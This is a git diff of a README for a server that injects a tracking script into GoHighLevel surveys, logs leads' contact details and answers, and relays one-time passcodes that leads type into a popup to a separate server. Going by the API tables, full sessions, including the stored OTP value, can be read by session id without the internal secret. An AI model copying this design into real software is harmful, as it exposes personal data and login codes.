@@ -1,37 +1,8 @@
 # GHL Survey Mirror Server
 
-Real-time session tracking for GHL (GoHighLevel) surveys with DynamoDB persistence, heartbeat monitoring, OTP popup, and a polling API for your mirror/automation server.
+Real-time session tracking for GHL (GoHighLevel) surveys with DynamoDB persistence, heartbeat monitoring, OTP popup, and a polling API for your automation server.
 
----
-
-## Architecture Overview
-
-```
-GHL Survey (browser)
-      │  survey-tracker.js (injected)
-      │
-      ▼
-Mirror Server (this app)          ←─── Other Server polls/calls
-  ├── /api/session/*                        ├── GET /api/internal/session/:id
-  ├── /api/internal/*                       ├── POST /api/internal/session/:id/otp-trigger
-  └── DynamoDB: Survey-MirrorSessions       └── POST /api/internal/session/:id/plan
-```
-
-### Flow
-
-1. Lead opens GHL survey → `survey-tracker.js` is injected
-2. Tracker fetches `GET /tracker-config` → gets slide selectors
-3. Email field blur / slide advance → `POST /api/session/init` with `{email, phone}`
-4. Server creates DynamoDB record + calls Other Server `session/start`
-5. On every slide change → `POST /api/session/slide-data` with previous slide fields
-6. Every 30 s → `POST /api/session/heartbeat`
-7. On tab/window close → `POST /api/session/exit` (via `sendBeacon`)
-8. Other server sends OTP → calls `POST /api/internal/session/:id/otp-trigger`
-9. Tracker polls `GET /api/session/:id/otp-status` — when `pending`, shows OTP modal
-10. Lead submits OTP → `POST /api/session/otp-submit` → forwarded to Other Server
-11. Other server verifies OTP → calls `POST /api/internal/session/:id/otp-status` `{status: 'valid'|'invalid'}`
-12. Tracker sees result from poll → closes modal (valid) or allows retry (invalid, max 3 attempts)
-13. Session marked `completed` when lead reaches last slide OR Other Server calls `POST /api/internal/session/:id/plan`
+**Live:** `https://mir.agentemp.com` · Port `9000` · PM2 name: `mirror-survey`
 
 ---
 
@@ -41,86 +12,115 @@ Mirror Server (this app)          ←─── Other Server polls/calls
 # 1. Install dependencies
 npm install
 
-# 2. Copy .env.example and fill in your values
+# 2. Copy .env and fill in values
 cp .env.example .env
 
-# 3. Create DynamoDB table (run once)
+# 3. Create DynamoDB table (run ONCE only)
 npm run setup-table
 
-# 4. Start server
-npm start          # production
-npm run dev        # development (nodemon)
+# 4. Start
+npm start        # production
+npm run dev      # development (nodemon)
 ```
+
+---
+
+## Inject Tracker into GHL Survey
+
+Add this to the GHL survey page (head or body custom code):
+
+```html
+<script src="https://mir.agentemp.com/tracker.js" defer></script>
+```
+
+The script auto-initializes, fetches slide config, and handles all session tracking.
+
+---
+
+## How It Works
+
+1. Lead opens survey → `tracker.js` is injected
+2. Tracker fetches `GET /tracker-config` → receives slide field selectors
+3. Email captured on slide 1 → `POST /api/session/init` → session created in DynamoDB
+4. Mirror Server calls Other Server `POST /session-started` (fire & forget) `{ sessionId, email, phone }`
+5. On every slide change → `POST /api/session/slide-data` with fields from the previous slide
+6. Every 30s → `POST /api/session/heartbeat` (no heartbeat for 20min = session auto-marked exited)
+7. On tab close → `POST /api/session/exit`
+8. Other Server decides to show OTP → calls our `POST /internal/otp-trigger`
+9. Tracker polls `GET /session/:id/otp-status` → sees `pending` → shows full-screen blur OTP modal
+10. Lead enters OTP → `POST /api/session/otp-submit` → saved to `otp.value` in DynamoDB
+11. Other Server polls `GET /session/:id` → reads `otp.value` → validates on their side
+12. Other Server calls our `PUT /internal/otp-status` `{ status: "valid" | "invalid" }`
+13. Tracker polls → sees result → closes modal (valid) or shows error and retries (invalid, max 3 attempts)
+14. Session marked `completed` when lead reaches last slide OR Other Server saves `plan_id`
 
 ---
 
 ## Environment Variables
 
-| Variable | Description |
-|---|---|
-| `PORT` | Server port (default `4000`) |
-| `AWS_REGION` | AWS region for DynamoDB |
-| `AWS_ACCESS_KEY_ID` | AWS access key |
-| `AWS_SECRET_ACCESS_KEY` | AWS secret key |
-| `DYNAMODB_SESSIONS_TABLE` | Table name (`Survey-MirrorSessions`) |
-| `HEARTBEAT_INTERVAL_MS` | Heartbeat interval in ms (default `30000`) |
-| `STALE_SESSION_MINUTES` | Minutes with no heartbeat = exited (default `20`) |
-| `OTHER_SERVER_BASE_URL` | Base URL of your automation server |
-| `OTHER_SERVER_SESSION_INIT_PATH` | Path called on session start |
-| `OTHER_SERVER_OTP_SUBMIT_PATH` | Path called with OTP value |
-| `OTHER_SERVER_API_KEY` | API key sent to other server |
-| `OTHER_SERVER_API_KEY_HEADER` | Header name for the API key |
-| `CORS_ALLOWED_ORIGINS` | Comma-separated allowed origins |
-| `INTERNAL_API_SECRET` | Secret for other server → us calls |
-| `SERVER_PUBLIC_URL` | Public URL injected into `tracker.js` |
+| Variable | Description | Default |
+|---|---|---|
+| `PORT` | Server port | `9000` |
+| `NODE_ENV` | Environment | `production` |
+| `SERVER_PUBLIC_URL` | Public URL injected into `tracker.js` | — |
+| `AWS_REGION` | AWS region | `us-east-1` |
+| `AWS_ACCESS_KEY_ID` | AWS access key | — |
+| `AWS_SECRET_ACCESS_KEY` | AWS secret key | — |
+| `DYNAMODB_SESSIONS_TABLE` | DynamoDB table name | `Survey-MirrorSessions` |
+| `HEARTBEAT_INTERVAL_MS` | Client heartbeat interval (ms) | `30000` |
+| `STALE_SESSION_MINUTES` | Minutes no heartbeat = exited | `20` |
+| `OTHER_SERVER_BASE_URL` | Base URL of automation server | — |
+| `OTHER_SERVER_SESSION_INIT_PATH` | Path notified on session start | `/api/mirror/session/start` |
+| `CORS_ALLOWED_ORIGINS` | Comma-separated allowed origins | — |
+| `INTERNAL_API_SECRET` | Shared secret for `/internal/*` calls | — |
 
 ---
 
 ## API Reference
 
-### Survey Client APIs (called by `survey-tracker.js`)
+### Survey Client APIs (`survey-tracker.js` → Mirror Server)
 
 | Method | Path | Body | Description |
 |---|---|---|---|
-| `POST` | `/api/session/init` | `{email, phone}` | Create session (call after email captured) |
-| `POST` | `/api/session/slide-data` | `{sessionId, slideName, fields}` | Save previous slide fields |
-| `POST` | `/api/session/heartbeat` | `{sessionId}` | Keep session alive |
-| `POST` | `/api/session/exit` | `{sessionId}` | Mark session exited |
-| `POST` | `/api/session/otp-submit` | `{sessionId, otp}` | Submit OTP (forwarded to other server) |
-| `GET` | `/api/session/:sessionId` | — | Full session read |
-| `GET` | `/api/session/:sessionId/otp-status` | — | Poll OTP status |
+| POST | `/api/session/init` | `{email, phone}` | Create session (once email captured) |
+| POST | `/api/session/slide-data` | `{sessionId, slideName, fields}` | Save previous slide fields |
+| POST | `/api/session/heartbeat` | `{sessionId}` | Keep session alive |
+| POST | `/api/session/exit` | `{sessionId}` | Mark session exited |
+| POST | `/api/session/otp-submit` | `{sessionId, otp}` | Save OTP value to DB |
+| GET  | `/api/session/:id` | — | Full session (for Other Server polling) |
+| GET  | `/api/session/:id/otp-status` | — | Lightweight OTP status poll |
 
-### Internal APIs (called by Other Server)
+### Internal APIs (Other Server → Mirror Server)
 
 All require header: `x-internal-secret: <INTERNAL_API_SECRET>`
 
 | Method | Path | Body | Description |
 |---|---|---|---|
-| `POST` | `/api/internal/session/:id/otp-trigger` | `{}` | Tell survey client to show OTP modal |
-| `POST` | `/api/internal/session/:id/otp-status` | `{status: 'valid'\|'invalid'}` | Set OTP verification result |
-| `POST` | `/api/internal/session/:id/plan` | `{planId}` | Save plan, mark session completed |
-| `GET` | `/api/internal/session/:id` | — | Read full session (with stale check) |
-| `GET` | `/api/internal/session/by-email/:email` | — | Find sessions by email |
+| POST | `/internal/otp-trigger` | `{sessionId}` | Show OTP popup on survey |
+| PUT  | `/internal/otp-status` | `{sessionId, status}` | Set OTP result (`valid`/`invalid`) |
+| POST | `/internal/session/:id/plan` | `{planId}` | Save plan, mark session completed |
+| GET  | `/internal/session/:id` | — | Read session with stale-check |
+| GET  | `/internal/session/by-email/:email` | — | Find sessions by email |
 
-### Tracker Endpoints
+### Utility
 
 | Method | Path | Description |
 |---|---|---|
-| `GET` | `/tracker-config` | Slide+field selector map (JSON) |
-| `GET` | `/tracker.js` | Client script with `SERVER_URL` injected |
-| `GET` | `/health` | Health check |
+| GET | `/tracker-config` | Slide field selector map (JSON) |
+| GET | `/tracker.js` | Client script with `SERVER_URL` injected |
+| GET | `/health` | Health check |
 
 ---
 
-## Injecting the Tracker into GHL Survey
+## What Other Server Must Implement
 
-In GHL, add a custom code injection (head or body):
+**Just 1 endpoint:**
 
-```html
-<script src="https://YOUR_MIRROR_SERVER/tracker.js" defer></script>
-```
+| Endpoint | Payload |
+|---|---|
+| `POST /api/mirror/session/start` | `{ sessionId, email, phone }` |
 
-The script auto-initializes, fetches config, and tracks everything.
+They call back our 2 internal endpoints (`/internal/otp-trigger` and `PUT /internal/otp-status`) and poll `GET /session/:id` for all field data.
 
 ---
 
@@ -139,7 +139,8 @@ The script auto-initializes, fetches config, and tracks everything.
   },
   "otp": {
     "status":   "none | pending | valid | invalid",
-    "attempts": 0
+    "attempts": 0,
+    "value":    "123456"
   },
   "planId":         null,
   "createdAt":      1721000000000,
@@ -155,9 +156,9 @@ The script auto-initializes, fetches config, and tracks everything.
 
 All selectors live in **`config/slides.js`** only.
 
-- Add a field → add it to the slide map in `config/slides.js`
-- Remove a field → delete it from `config/slides.js`
-- Move a field to another slide → cut/paste between slide objects
+- Add a field → add it to the slide map
+- Remove a field → delete it from the slide map
+- Move a field → cut/paste between slide objects
 
 No other file needs to change.
 
@@ -167,22 +168,27 @@ No other file needs to change.
 
 | Status | Meaning |
 |---|---|
-| `active` | Session running, heartbeats being received |
-| `exited` | Lead closed tab / no heartbeat for 20+ min |
-| `completed` | Lead reached last slide OR `plan` was saved |
-
-Stale detection fires:
-- per-request on `GET /api/session/:id` and `GET /api/internal/session/:id`
-- passively via the 5-minute sweeper interval in `server.js`
+| `active` | Running, heartbeats received |
+| `exited` | Tab closed or no heartbeat for 20+ min |
+| `completed` | Last slide reached or `plan_id` saved |
 
 ---
 
 ## OTP Modal Behaviour
 
-1. Other server sends OTP to lead and calls → `POST /api/internal/session/:id/otp-trigger`
-2. Survey tracker polls every 2 s; sees `otp.status === 'pending'` → shows full-screen blur modal
-3. Lead enters OTP → `POST /api/session/otp-submit` → forwarded to other server
-4. Tracker polls until `otp.status` changes to `valid` or `invalid`
-5. **Valid** → modal closes, survey continues
-6. **Invalid** + attempts < 3 → shows error with email/phone, clears field, allows retry, resets status to `pending`
-7. **Invalid** + attempts ≥ 3 → shows final error, modal auto-closes after 3 s, survey resumes
+1. Other Server sends OTP to lead → calls `POST /internal/otp-trigger`
+2. Survey tracker polls `/otp-status` → sees `pending` → shows full-screen blur modal
+3. Lead enters OTP → saved to `otp.value` in DB
+4. Other Server sees OTP in DB → validates → calls `PUT /internal/otp-status`
+5. **Valid** → modal closes, survey resumes
+6. **Invalid** (attempt 1–2) → shows error with lead's email/phone, clears field, resets to `pending`, allows retry
+7. **Invalid** (attempt 3) → shows final error, closes modal, survey resumes anyway
+
+---
+
+## Deploy
+
+```bash
+./deploy.sh           # redeploy (files + npm install + pm2 restart)
+./deploy.sh --setup   # first-time setup (Node, Nginx, PM2, optional SSL)
+```
